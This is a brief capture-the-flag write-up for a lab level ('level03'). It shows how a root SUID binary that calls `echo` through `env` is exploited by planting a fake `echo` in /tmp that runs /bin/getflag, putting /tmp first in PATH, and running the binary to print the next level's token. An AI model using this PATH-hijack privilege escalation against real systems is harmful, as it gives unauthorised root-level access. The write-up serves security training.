level03 executable is a file with SUID bit (execute with root permissions).
This file use `/usr/bin/env echo`.

Add our personnal echo command in /tmp
```bash
touch /tmp/echo						# to create the file
chmod +x /tmp/echo					# to set the file as en executable
echo "/bin/getflag" > /tmp/echo		# to redirect echo -> getflag
```

Change $PATH to change the echo used by level03 executable
```bash
export PATH=/tmp:$PATH				# to search in /tmp before /bin
```

Execute level03 and get the level04 password
```bash
./level03
```
result: Check flag.Here is your token : qi0maab88jeaj46qoumi7maus